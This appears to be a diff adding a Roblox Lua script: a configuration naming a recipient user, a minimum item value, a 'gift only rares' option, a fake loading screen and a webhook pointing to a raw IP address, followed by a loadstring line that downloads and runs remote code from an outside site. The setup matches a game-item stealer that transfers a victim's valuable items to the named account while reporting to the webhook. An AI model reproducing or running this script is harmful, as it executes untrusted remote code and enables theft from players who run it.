@@ -1,0 +1,13 @@
+_G.LRMConfig = {
+    User = {"hazem666932"},
+    min_value = 1000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/87355208fd0acad8a78330d34529f57f",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/87355208fd0acad8a78330d34529f57f",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
